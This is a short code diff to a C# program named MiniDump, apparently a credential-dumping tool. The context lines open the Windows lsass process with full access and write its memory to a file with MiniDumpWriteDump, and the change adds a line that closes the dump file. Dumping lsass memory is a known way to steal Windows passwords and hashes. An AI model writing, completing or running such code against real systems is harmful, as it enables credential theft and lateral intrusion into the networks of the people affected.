@@ -18,6 +18,7 @@ namespace MiniDump
             int lsass_pid = lsass[0].Id;
             IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
             bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            dumpFile.Close();
         }
     }
 }
